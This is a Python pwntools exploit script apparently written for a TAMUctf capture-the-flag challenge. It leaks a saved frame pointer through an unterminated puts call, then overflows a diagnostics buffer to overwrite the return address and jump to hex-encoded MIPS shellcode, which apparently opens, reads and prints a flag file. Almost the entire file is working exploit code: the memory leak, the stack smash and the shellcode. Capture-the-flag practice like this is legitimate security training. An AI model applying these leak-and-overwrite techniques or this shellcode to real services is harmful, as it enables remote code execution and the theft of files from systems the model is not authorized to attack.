import struct

from pwn import *


context.log_level = "info"

HOST = "streams.tamuctf.com"
PORT = 443
SNI = "meep"

# greet's buffer starts at s8+0x1c and saved s8 sits at s8+0xa0,
# so 132 bytes of non-NUL data make puts(buf) spill exactly 4 bytes
# of the caller frame pointer before stopping on the saved ra's leading NUL.
GREET_LEAK_LEN = 132

# diagnostics is called from the same main frame on the same connection.
# Its buffer is placed at main_s8 - 0x90.
DIAG_BUF_FROM_MAIN_S8 = 0x90

FLAG_PATH_SC = bytes.fromhex(
    "3c092f6835296f6dafa9fff03c09652f3529666c"
    "afa9fff43c09616735292e74afa9fff83c097874"
    "afa9fffc27bdfff02404ff9c03a0282000003025"
    "00003825340210c00000000c0040202527a5ff00"
    "3406010034020fa30000000c3404000127a5ff00"
    "0040302534020fa40000000c34020fa10000000c"
)


def connect():
    return remote(HOST, PORT, ssl=True, sni=SNI)


def make_diag_payload(shellcode: bytes, addr: int) -> bytes:
    payload = shellcode.ljust(0x80, b"A")
    payload += struct.pack(">I", 0x42424242)  # s0
    payload += struct.pack(">I", 0x43434343)  # s1
    payload += struct.pack(">I", 0x44444444)  # fp
    payload += struct.pack(">I", addr)        # ra
    return payload.ljust(0x100, b"Z")


def leak_main_s8(io) -> int:
    io.recvuntil(b"Enter admin name: ")
    io.send(b"A" * GREET_LEAK_LEN)
    data = io.recvuntil(b"Enter diagnostic command:\n\x00")

    marker = b"A" * GREET_LEAK_LEN
    marker_off = data.rfind(marker)
    if marker_off == -1:
        raise ValueError(f"failed to find greet marker in leak: {data!r}")

    leak_off = marker_off + GREET_LEAK_LEN
    leak = data[leak_off:leak_off + 4]
    if len(leak) != 4:
        raise ValueError(f"short saved-s8 leak: {leak!r}")

    main_s8 = struct.unpack(">I", leak)[0]
    log.info(f"leaked main s8 = {hex(main_s8)}")
    return main_s8


def run() -> bytes:
    io = connect()
    try:
        main_s8 = leak_main_s8(io)
        diag_buf = main_s8 - DIAG_BUF_FROM_MAIN_S8
        log.info(f"diagnostics buffer = {hex(diag_buf)}")

        io.send(make_diag_payload(FLAG_PATH_SC, diag_buf))
        data = io.recvrepeat(1.5)
        if not data:
            raise EOFError("remote closed before returning flag data")
        return data
    finally:
        io.close()


def extract_flag_text(data: bytes) -> str:
    lines = [line.strip(b"\r") for line in data.splitlines()]
    useful = [line for line in lines if line and line != b"Running command..."]
    if useful:
        return useful[-1].decode(errors="replace")
    return data.decode(errors="replace").strip()


if __name__ == "__main__":
    out = run()
    print(extract_flag_text(out))
